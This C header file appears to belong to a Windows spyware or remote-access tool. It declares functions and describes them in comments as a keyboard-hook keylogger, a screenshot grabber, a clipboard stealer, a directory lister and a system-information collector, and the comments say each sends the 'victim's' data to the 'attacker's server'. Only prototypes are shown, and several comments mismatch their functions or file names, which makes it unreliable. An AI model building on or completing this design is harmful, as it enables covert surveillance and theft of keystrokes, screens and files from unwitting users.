#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>

/***********************************************************************
 FILE: list.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		User is prompted for 3 different inputs.
		1. What file path/directory they want to list the files in?
		2. Do they want to recursively list the files within the
			directory? (List contents of folders of the folders...)
		3. Do they want to list files too?

		listDir function is then called with the specifications.
*************************************************************************/
int list();

/***********************************************************************
 FILE: list.c

 PARAMS: 
		1. STRSAFE_LPCWSTR = Path of directory you want to list.
		2. STRSAFE_LPCWSTR = Char that indicates whether to list files.
		3. STRSAFE_LPCWSTR = Char that indicates listing recursively.
		4.	int = Indicates level of recursion.

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Files/directories are listed and sent to the attacking
		server.
*************************************************************************/
int listDir(STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, int);

/***********************************************************************
 FILE: networking.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Socket is opened, data is sent, data is received, socket
		socket is closed.
*************************************************************************/
int sendFile();

/***********************************************************************
 FILE: networking.c

 PARAMS: 
		1. char* = If file being sent, filepath. If data being sent, data.
		2. int = 1 - file is being sent, 0 - data is being sent

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
*************************************************************************/
int sendHome(char*, int);

/***********************************************************************
 FILE: screenshot.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Screenshot is taken of the victims screen, sent to the
		Attacker and deleted.
*************************************************************************/
int screenshot();

/***********************************************************************
 FILE: screenshot.c

 PARAMS: 
		1. LPTSTR = Filepath where the screenshot will be saved.
		2. PBITMAPINFO = Bitmap header data.
		3. HBITMAP = Bitmap data.
		4. HDC = Compatibility context.

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Writes file with contents of the user's screenshot.
*************************************************************************/
int createBMPFile(LPTSTR, PBITMAPINFO, HBITMAP, HDC);

/***********************************************************************
 FILE: screenshot.c

 PARAMS: 
		1. HBITMAP = Bitmap handle.

 RETURNS: 
		PBITMAPINFO = Bitmap data for it to be formed later.

 DESCRIPTION: 
		Gives values to the bitmap header for file to be formed later.
*************************************************************************/
PBITMAPINFO createBitmapInfo(HBITMAP);

/***********************************************************************
 FILE: keylogger.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Creates a keyboard hook to capture the victims keystrokes.
*************************************************************************/
int keylogger();

/***********************************************************************
 FILE: keylogger.c

 PARAMS: 
		1. int = Value of latest pressed key
		2. WPARAM =  The identifier of the keyboard message.
		3. LPARAM = A pointer to a KBDLLHOOKSTRUCT structure.

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Maps the incoming value from the key pressed to a string.
*************************************************************************/
LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);

/***********************************************************************
 FILE: clipboard.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully
		int = 1 - returned with error

 DESCRIPTION: 
		Sends the Victim's clipboard contents to Attacker's server.
*************************************************************************/
int clipboard();

/***********************************************************************
 FILE: clipboard.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		calls getUserInfo, getMemoryUsage, getSystemInfo
*************************************************************************/
int getIntel();

/***********************************************************************
 FILE: clipboard.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Sends the Victim's computer information to Attacker's server.
*************************************************************************/
int getUserInfo();

/***********************************************************************
 FILE: clipboard.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Sends the Victim's memory usage stats to Attacker's server.
*************************************************************************/
int getMemoryUsage();

/***********************************************************************
 FILE: intel.c

 PARAMS: 
		N/A

 RETURNS: 
		int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: 
		Sends the Victim's clipboard contents to Attacker's server.
*************************************************************************/
int getSystemInfo();

#endif